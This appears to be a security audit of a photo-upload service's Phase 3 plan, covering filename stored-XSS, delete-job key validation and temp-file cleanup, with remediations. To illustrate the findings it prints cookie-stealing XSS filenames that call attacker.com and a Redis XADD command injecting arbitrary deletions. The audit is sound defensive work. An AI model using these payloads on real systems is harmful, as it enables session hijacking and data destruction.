## Finding #1: `original_filename` Stored Without Sanitization — Stored XSS Surface in Phase 4 Rendering

**Vulnerability:** Stored Cross-Site Scripting — OWASP A03 (Injection)
**Severity:** Medium
**Confidence:** Medium
**Attack Complexity:** Low (craft filename), Medium (requires Phase 4 rendering gap)

**Location:**
- Plan: Task 3.2, Step 4 — upload endpoint, `original_filename` column description
- Contrast: Task 3.5, Step 4 — `MetadataExtractor` — all EXIF string values sanitized ✓
- Contrast: Task 3.5, Step 4 — `caption`, `title`, `description` individually sanitized ✓

**Risk & Exploit Path:**

The upload endpoint stores the user-supplied filename for display purposes:
> "The user-supplied filename extension is **never** used in `storage_key` or any file I/O path. If the original filename must be preserved for user display, store it in a separate `original_filename` column (display-only)."

`original_filename` is extracted from the HTTP multipart `Content-Disposition` header's `filename` parameter via Spring's `MultipartFile.getOriginalFilename()`. This value is entirely user-controlled. No sanitization step is specified in the plan before the value is written to `photos.original_filename`.

An attacker sets their upload filename to:
```
"><img src=x onerror="fetch('//attacker.com?c='+btoa(document.cookie))">.jpg
```

This is written verbatim to `photos.original_filename`. In Phase 4, if any component renders `original_filename` via `dangerouslySetInnerHTML`, a template literal inserted into a `<title>` or `<meta>` attribute, or any pattern other than a React text node (`{photo.originalFilename}`), the payload executes in the victim's browser. The owner of the photo is the attacker themselves, so the XSS is self-inflicted — but if photos are ever shared (Phase 4 shares feature, public galleries, admin views), other users' sessions are at risk.

The severity of the oversight is heightened by the contrast with the plan's own EXIF sanitization posture. The plan applies `Jsoup.parse(s).text()` to every string-typed value in the raw EXIF map — including obscure fields like `GPS:GPSAreaInformation`. Yet `original_filename`, which is a direct HTTP header value with no structural constraint, is stored raw. Phase 4 engineers will see `original_filename` in the DB schema and may not know it requires special handling, since the plan does not add a rendering note for it (unlike EXIF fields, which carry an explicit Phase 4 note).

**Evidence / Trace:**

```
Task 3.2, Step 4 — Upload endpoint:

  // File extension derived from Tika — correct, system-controlled:
  String ext = MIME_TO_EXT.get(tikaDetectedMimeType);   ← MIME-based ✓

  // Original filename stored for display:
  String originalFilename = multipartFile.getOriginalFilename();  ← user-controlled
  // INSERT INTO photos (..., original_filename, ...) VALUES (..., ?, ...)
  //                                                             ↑ raw, unsanitized ← GAP

Task 3.5, Step 4 — MetadataExtractor (correctly sanitized):
  Map<String, Object> sanitizedExifData = rawExifData.entrySet().stream()
      .collect(Collectors.toMap(
          Map.Entry::getKey,
          e -> e.getValue() instanceof String s ? Jsoup.parse(s).text() : e.getValue()
      ));                                          ← ALL EXIF string values sanitized ✓

  // But original_filename — sourced directly from HTTP header — has no equivalent sanitization
```

**Remediation:**
- **Primary fix (Phase 3):** Sanitize `original_filename` at write time using the same pattern established in the plan:
  ```java
  String safeOriginalFilename = originalFilename != null
      ? Jsoup.parse(originalFilename).text()
      : null;
  ```
  This is consistent with the `Jsoup.parse(s).text()` pattern already mandated for EXIF fields and strips HTML tags, preventing stored XSS regardless of Phase 4 rendering choices.
- **Add test:** Extend `upload_withMaliciousFilenameExtension_usesNormalizedExtension()` or add a new test `upload_sanitizesOriginalFilenameForDisplay()` asserting that `<script>` tags in the uploaded filename are stripped before DB write.
- **Phase 4 note (add to Task 3.2):** Add the following note consistent with the EXIF rendering note in Task 3.5:
  > "Phase 4 note: `original_filename` is user-supplied and must be rendered via React text nodes only (`{photo.originalFilename}`); never via `dangerouslySetInnerHTML` or as an unescaped attribute value."
- **Defense-in-depth:** The sanitization-at-write approach is strictly cheaper than auditing all Phase 4 render sites. Fixing here ensures clean storage regardless of which Phase 4 components display it.

**References:**
- CWE-79: Improper Neutralization of Input During Web Page Generation
- OWASP A03:2021 — Injection

## Finding #2: `DeleteJobConsumer` Does Not Validate Storage Key Format — Defense-in-Depth Gap Against Redis Compromise

**Vulnerability:** Insufficient Input Validation / Defense-in-Depth — OWASP A04 (Insecure Design)
**Severity:** Low
**Confidence:** Medium
**Attack Complexity:** High (requires Redis write access — internal, password-protected)

**Location:**
- Plan: Task 3.4, Step 3 — `DeleteJobConsumer` implementation
- Related: Task 3.1, Step 1 — Worker MinIO policy scoped to `GetObject/PutObject/DeleteObject` on `jpt-photos/*`

**Risk & Exploit Path:**

The worker MinIO policy (`worker-policy.json`) grants `s3:DeleteObject` on `arn:aws:s3:::jpt-photos/*` — any object within the bucket, not restricted to a specific prefix. `DeleteJobConsumer` receives the `original_key`, `thumbnail_sm`, and `thumbnail_md` fields from the Redis Stream message and deletes the corresponding MinIO objects.

SA2-F5 added a null/blank guard:
```java
if (originalKey == null || originalKey.isBlank()) {
    log.error("delete-job received with null originalKey...");
    redisCommands.xack(...);
    return;
}
```

This prevents NPE/empty-key failures. However, the consumer does not validate that `original_key` matches the expected structural format: `{uuid}/originals/{uuid}.{ext}`. Any non-null, non-blank string passes through directly to a MinIO `removeObject` call.

Under normal operation, all delete-jobs are produced by system components (`TrashPurgeScheduler`, `UnverifiedAccountPurgeScheduler`) using storage keys fetched from the `photos` table — system-controlled UUIDs. The risk is conditional on Redis write access.

If an attacker achieves Redis write access (e.g., via a misconfigured Redis AUTH, a compromised internal service, or a container escape), they can inject a delete-job with an arbitrary `original_key`:
```
XADD delete-jobs * photo_id 00000000-0000-0000-0000-000000000000 original_key admin/backup/db-dump.sql thumbnail_sm "" thumbnail_md ""
```
The consumer passes the null/blank check (thumbnail keys are blank but `original_key` is not), then calls `minioClient.removeObject(..., "admin/backup/db-dump.sql")`. The worker's `s3:DeleteObject` permission covers any key in `jpt-photos/*`, so the deletion succeeds if the key exists.

The attack requires compromising a component on the internal Docker network. This is a defense-in-depth gap, not an externally exploitable vulnerability. However, adding a format guard costs one regex check and meaningfully limits blast radius in a worst-case lateral-movement scenario.

**Evidence / Trace:**

```
Task 3.4, Step 3 — DeleteJobConsumer:

  // SA2-F5 null-key guard (correct):
  if (originalKey == null || originalKey.isBlank()) {
      log.error("delete-job received with null originalKey...");
      redisCommands.xack(...);
      return;
  }                                                          ← guards null/blank ✓

  // No format validation:
  minioClient.removeObject(
      RemoveObjectArgs.builder()
          .bucket(bucket)
          .object(originalKey)          ← any non-blank string passes through ← GAP
          .build());

Worker MinIO policy (Task 3.1, Step 1):
  "Resource": "arn:aws:s3:::jpt-photos/*"   ← any object in bucket deletable
```

**Remediation:**
- **Primary fix:** Add a format validation check after the null/blank guard:
  ```java
  private static final Pattern STORAGE_KEY_PATTERN =
      Pattern.compile("^[0-9a-f-]{36}/(originals|thumbnails)/[0-9a-f-]{36}(_sm|_md)?\\.[a-z0-9]+$");

  if (!STORAGE_KEY_PATTERN.matcher(originalKey).matches()) {
      log.error("delete-job originalKey failed format validation — XACK and skip, key={}, photo_id={}",
          originalKey, photoId);
      redisCommands.xack(DELETE_JOBS_STREAM, CONSUMER_GROUP, messageId);
      return;
  }
  ```
  Apply the same pattern check to `thumbnail_sm` and `thumbnail_md` before each MinIO call.
- **Architectural improvement:** Consider scoping the worker MinIO policy to a specific prefix pattern (e.g., `arn:aws:s3:::jpt-photos/*/originals/*` and `arn:aws:s3:::jpt-photos/*/thumbnails/*`) rather than the entire bucket. This limits blast radius at the IAM level rather than only at the application level.
- **Defense-in-depth:** Redis AUTH is already required; ensure the Redis password is rotated on any suspected lateral movement incident.

**References:**
- CWE-20: Improper Input Validation
- OWASP A04:2021 — Insecure Design

## Finding #3: ExifTool Temp File Cleanup Uses `File.delete()` — Silent Failure Inconsistent With `Files.deleteIfExists()` Pattern

**Vulnerability:** Resource Leak / Inconsistent Cleanup — OWASP A05 (Security Misconfiguration)
**Severity:** Low
**Confidence:** High
**Attack Complexity:** N/A (internal reliability issue)

**Location:**
- Plan: Task 3.5, Step 4 — `MetadataExtractor`, ExifTool temp file cleanup
- Contrast: Task 3.5, Step 3 — `ThumbnailGenerator`, temp file cleanup (correctly uses `Files.deleteIfExists()`)

**Risk & Exploit Path:**

The plan specifies two temp file cleanup patterns in the same task:

**ThumbnailGenerator (correct):**
```java
Path tmp = Files.createTempFile(Path.of("/tmp"), photoId.toString(), "." + ext);
try {
    // download, process
} finally {
    Files.deleteIfExists(tmp);   ← NIO; throws IOException on I/O error ✓
}
```

**MetadataExtractor (inconsistent):**
```java
File outputFile = File.createTempFile("exiftool-", ".json");
try {
    // ...
} finally {
    outputFile.delete();   ← legacy API; returns boolean; silently ignores failure ← GAP
}
```

`File.delete()` returns `false` if the file cannot be deleted (I/O error, permissions issue, file already deleted). The return value is not checked. A failed delete is silently swallowed, leaving the ExifTool JSON output file on the worker's `/tmp` tmpfs. Under normal conditions, permission failures on worker-owned files in tmpfs are unlikely. However:

- Under abnormal conditions (e.g., a partial container filesystem issue, a tmpfs near-full state causing write failures), `File.delete()` could begin failing silently.
- Each undeleted file accumulates on the 1 GB tmpfs. ExifTool JSON output for photos with large XMP blocks can reach 100–300 KB. Over time, under sustained partial-failure conditions, tmpfs saturation becomes possible.
- A saturated tmpfs causes all subsequent `File.createTempFile()` and `Files.createTempFile()` calls to throw `IOException`, stalling all worker processing until the container is restarted.
- The worker is single-threaded and has no tmpfs monitoring; the failure mode is silent degradation.

This is not directly exploitable externally, but the inconsistency between the two cleanup patterns in the same task is a code-quality and reliability gap. Since the plan explicitly specifies code patterns for implementation, the inconsistency will propagate directly to the implemented code.

**Evidence / Trace:**

```
Task 3.5, Step 3 — ThumbnailGenerator:
  } finally {
      Files.deleteIfExists(tmp);   ← correct: throws on I/O error, visible in logs ✓
  }

Task 3.5, Step 4 — MetadataExtractor:
  } finally {
      outputFile.delete();         ← incorrect: return value ignored, failure silent ← GAP
  }

Divergence: same task, same /tmp tmpfs, two different cleanup APIs.
```

**Remediation:**
- **Primary fix:** Replace `File.delete()` with `Files.deleteIfExists()` for consistency:
  ```java
  // Before:
  outputFile.delete();

  // After:
  Files.deleteIfExists(outputFile.toPath());
  ```
  Since this is in a `finally` block, consider logging rather than propagating a delete failure to avoid masking the original exception:
  ```java
  try {
      Files.deleteIfExists(outputFile.toPath());
  } catch (IOException e) {
      log.warn("Failed to delete ExifTool temp file: {}", outputFile.getAbsolutePath(), e);
  }
  ```
- **Architectural improvement:** Consider a shared `TempFileManager` utility that wraps `Files.createTempFile()` and `Files.deleteIfExists()` with consistent logging, used by both `ThumbnailGenerator` and `MetadataExtractor`. This avoids divergence across future implementations.

**References:**
- CWE-459: Incomplete Cleanup

### Pass 3: Cross-Cutting & Compositional Analysis

**Chain A: Crafted Filename → Stored XSS → Session Hijack (Finding #1)**

An attacker uploads a file with a crafted filename (e.g., `"><script src=//attacker.com/x.js></script>.jpg`). The filename is stored raw in `photos.original_filename`. Phase 4 adds a "filename" display field to the photo detail view. A developer uses a framework template that does not auto-escape (e.g., `v-html` in Vue, or a misused React ref with `innerHTML`), or renders the filename in a `<title>` tag via server-side rendering without escaping. The script executes, harvesting the session token of any user who views the photo — including admin users if the photo appears in an admin moderation view.

The chain is passive in Phase 3 (write path only) but becomes active on Phase 4 rollout. The probability of a rendering gap is non-trivial: `original_filename` is not in the same category as `exif_data` (Phase 4 note present) and does not obviously require sanitization to a Phase 4 engineer. Fix in Phase 3 eliminates the chain before Phase 4 introduces any rendering.

**Chain B: Redis Compromise → Mass MinIO Object Deletion via DeleteJobConsumer (Finding #2)**

An attacker achieves Redis write access (via lateral movement from a compromised container, a Redis AUTH weakness, or a SSRF hitting the Redis port). They inject 1,000 delete-jobs targeting all MinIO objects in `jpt-photos/`. `DeleteJobConsumer` processes each message, passing the null/blank guard (keys are non-empty), and issues MinIO `removeObject` for each. The worker MinIO policy covers all keys in the bucket. All users' photos and thumbnails are deleted. At MAX_RETRIES with 3 deliveries × 1,000 jobs = 3,000 MinIO delete calls — all succeed (idempotent), leaving all photos permanently gone.

Adding key-format validation (Finding #2 remediation) would block all injected keys that don't match the expected UUID-based format. The MinIO policy prefix restriction would further limit the blast radius at the IAM level.

**Defense-in-depth assessment:**

v5.0 achieves a substantially stronger posture than any prior version. The two medium findings from SA2 (JSONB unsanitized, ExifTool pipe hang) are cleanly resolved with the correct implementation patterns. The three low findings (library pinning, compensating-Tx floor guard, null delete-jobs) are all resolved. The remaining issues are narrow:

- Finding #1 is an oversight in an otherwise comprehensive sanitization posture — a single user-supplied string field missed in the same task that sanitizes dozens of EXIF fields.
- Finding #2 is a defense-in-depth gap conditional on Redis compromise — not an externally reachable attack surface.
- Finding #3 is a code consistency issue with low practical impact given the worker's single-threaded model and tmpfs isolation.

None of the three findings requires architectural change. All are plan-text or code-pattern corrections.

## 1. Executive Summary

Phase 3 v5.0 successfully resolves all five findings from security audit 2. The EXIF/IPTC JSONB stored XSS surface is now comprehensively closed: all string-typed values in the raw EXIF map are sanitized via `Jsoup.parse(s).text()` before JSONB assembly, covering not just the three named fields but every metadata string field including `UserComment`, `Artist`, `Copyright`, and `GPS:GPSAreaInformation`. The ExifTool pipe-buffer exhaustion vulnerability is eliminated by redirecting stdout to a temp file before `waitFor()`. Library and native binary versioning is now uniformly pinned with Trivy SBOM scanning.

One medium finding remains: `original_filename` — a direct HTTP multipart header value — is stored without sanitization, while every EXIF string field in the same pipeline receives `Jsoup.parse(s).text()` treatment. The fix is one line of code consistent with the established pattern, plus a Phase 4 rendering note matching the EXIF note already in the plan. Without it, Phase 4 introduces a stored XSS attack surface whose exploit path requires only a crafted filename and a single rendering oversight.

Two low findings cover defense-in-depth gaps. `DeleteJobConsumer` validates null/blank keys (SA2-F5) but does not validate key format, limiting blast radius protection in a Redis-compromise scenario. The MetadataExtractor uses `File.delete()` (silent failure) rather than the `Files.deleteIfExists()` pattern established by `ThumbnailGenerator` in the same task — a code consistency issue that could lead to silent tmpfs accumulation under failure conditions.

Overall, the plan is in strong shape. The medium finding should be resolved before Phase 3 implementation begins (as the write-path fix is cheapest here). The two low findings are opportunistic improvements.

## 4. Positive Security Observations

1. **EXIF/IPTC/XMP sanitization is now comprehensive.** SA2-F1 was resolved not by adding a few more named-field calls, but with a stream operation over the entire EXIF map: `e.getValue() instanceof String s ? Jsoup.parse(s).text() : e.getValue()`. This ensures no future EXIF field — however obscure — is stored unsanitized. The accompanying note clarifying the `.text()` vs `Jsoup.clean()` distinction (entity encoding) shows genuine understanding of the API, not cargo-cult application.

2. **ExifTool stdout handling is specified correctly and with full rationale.** The redirect-to-file pattern (`pb.redirectOutput(outputFile)`) is simpler than async threading, avoids extra thread lifecycle management, and correctly solves the 64 KB pipe buffer exhaustion problem. The plan explains the "Why redirect-to-file" rationale and notes that libvips/libraw write to files (not stdout) and do not have this issue — demonstrating that the fix is targeted, not a blanket policy.

3. **Database-level quota integrity is now structurally enforced.** The combination of `GREATEST(0, used_bytes - :file_size)` floor guards in both the compensating Tx and the null-`storage_key` CTE, plus the V6 Flyway migration adding `CHECK (used_bytes >= 0)`, means that no code path — present or future — can produce a negative `used_bytes` value without a hard constraint violation. This converts a defense-in-depth oversight into a structural guarantee.

4. **Orphan reconciliation is TOCTOU-free by design.** The `SELECT EXISTS(SELECT 1 FROM photos WHERE id = :photo_id)` check exploits the plan's own structural invariant (DB row inserted in Tx 1 before any MinIO object exists), making it impossible for an in-progress upload to be misidentified as an orphan. The design note explaining why the previous `storage_key IS NULL` comparison was wrong demonstrates that the fix was reasoned, not coincidental.

5. **Startup recovery distributed lock is implemented with correct ownership semantics.** The Lua ownership-check script (`GET key == instanceId → SET XX`) correctly handles the GC-pause / lock-expiry race that a plain `SET XX` would not. The plan explains precisely why `SET XX` alone is insufficient ("key exists but not the current value — if the lock expires and a second instance acquires it, `XX` still succeeds and overwrites"). This is a subtle distributed systems security property documented with rigor.

- Effort: **Quick Win** (2-line change)
- Owner: Backend
